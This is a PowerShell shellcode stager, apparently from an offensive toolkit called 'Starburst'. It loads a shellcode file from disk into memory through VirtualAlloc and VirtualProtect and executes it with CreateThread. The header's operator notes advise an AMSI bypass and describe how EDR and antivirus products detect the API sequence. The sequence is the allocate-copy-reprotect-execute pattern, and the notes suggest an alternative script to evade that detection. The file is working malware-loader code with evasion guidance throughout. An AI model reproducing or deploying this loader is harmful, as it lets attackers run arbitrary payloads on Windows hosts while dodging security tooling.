# ============================================================================
# Starburst Stager - VirtualAlloc + CreateThread
# ============================================================================
# Technique:  Allocate RW memory, copy shellcode, flip to RX, CreateThread
# OPSEC Notes:
#   - AMSI will inspect this script. Apply AMSI bypass before execution.
#   - ScriptBlock logging will capture the full script content.
#   - VirtualAlloc + CreateThread is a well-known pattern monitored by EDR.
#   - The API call sequence (VirtualAlloc -> VirtualProtect -> CreateThread)
#     is a signature for many AV/EDR products.
#   - Consider using stager_delegate.ps1 to avoid CreateThread detection.
#   - PowerShell Constrained Language Mode will block Add-Type.
# ============================================================================

# --- OPERATOR: Set shellcode path ---
$ShellcodePath = "C:\path\to\starburst.bin"

# Read shellcode from disk
if (-not (Test-Path $ShellcodePath)) {
    Write-Error "Shellcode file not found: $ShellcodePath"
    exit 1
}
[Byte[]]$Shellcode = [System.IO.File]::ReadAllBytes($ShellcodePath)

# P/Invoke definitions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Constants
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$INFINITE = 0xFFFFFFFF

# Allocate RW memory
$Address = [Win32]::VirtualAlloc(
    [IntPtr]::Zero,
    [uint32]$Shellcode.Length,
    ($MEM_COMMIT -bor $MEM_RESERVE),
    $PAGE_READWRITE
)

if ($Address -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed"
    exit 1
}

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Address, $Shellcode.Length)

# Clear shellcode from managed memory
[Array]::Clear($Shellcode, 0, $Shellcode.Length)

# Flip memory protection from RW to RX
$OldProtect = 0
$ProtectResult = [Win32]::VirtualProtect(
    $Address,
    [uint32]$Shellcode.Length,
    $PAGE_EXECUTE_READ,
    [ref]$OldProtect
)

if (-not $ProtectResult) {
    Write-Error "VirtualProtect failed"
    exit 1
}

# Create thread at shellcode address
$ThreadId = 0
$ThreadHandle = [Win32]::CreateThread(
    [IntPtr]::Zero,
    0,
    $Address,
    [IntPtr]::Zero,
    0,
    [ref]$ThreadId
)

if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Error "CreateThread failed"
    exit 1
}

# Wait for thread to complete
[Win32]::WaitForSingleObject($ThreadHandle, $INFINITE) | Out-Null
[Win32]::CloseHandle($ThreadHandle) | Out-Null
